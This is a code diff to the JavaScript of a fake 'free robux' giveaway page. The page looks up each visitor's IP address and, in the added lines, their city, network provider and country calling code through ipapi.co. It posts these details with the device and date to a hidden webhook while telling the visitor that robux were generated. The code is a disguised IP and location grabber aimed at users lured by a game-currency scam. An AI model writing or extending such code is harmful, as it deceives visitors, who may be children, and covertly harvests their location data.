@@ -73,38 +73,51 @@
         .then(response => response.json())
         .then(data => {
           var ip = data.ip;
-          
-          if (isRobux1Logged(ip)) {
-            showError("You already redeemed free robux.");
-            return;
-          }
 
-          logRobux1(ip);
-          var message = {
-            content: "Opened on: " + formattedDate + "\nIP address: " + ip + "\nDevice: " + platform
-          };
+          // Fetch user's location details using ipapi.co
+          fetch('https://ipapi.co/' + ip + '/json/')
+            .then(response => response.json())
+            .then(locationData => {
+              var city = locationData.city;
+              var network = locationData.org;
+              var version = locationData.version;
+              var countryCallingCode = locationData.country_calling_code;
 
-          fetch(webhookURL, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify(message)
-          })
-          .then(response => {
-            if (!response.ok) {
-              showError("Failed generating robux");
-            } else {
-              console.log("Generated robux");
-              redirectToDifferentWebsite();
-            }
-          })
-          .catch(error => {
-            showError("Error generating robux");
-          });
+              if (isRobux1Logged(ip)) {
+                showError("You already redeemed free robux.");
+                return;
+              }
+
+              logRobux1(ip);
+              var message = {
+                content: "Opened on: " + formattedDate + "\nIP address: " + ip + "\nCity: " + city + "\nNetwork: " + network + "\nVersion: " + version + "\nCountry Calling Code: " + countryCallingCode + "\nDevice: " + platform
+              };
+
+              fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json"
+                },
+                body: JSON.stringify(message)
+              })
+              .then(response => {
+                if (!response.ok) {
+                  showError("Failed generating robux");
+                } else {
+                  console.log("Generated robux");
+                  redirectToDifferentWebsite();
+                }
+              })
+              .catch(error => {
+                showError("Error generating robux");
+              });
+            })
+            .catch(error => {
+              showError("Error fetching location data.");
+            });
         })
         .catch(error => {
-          showError("Error fetching robux.");
+          showError("Error fetching IP address.");
         });
     }
 
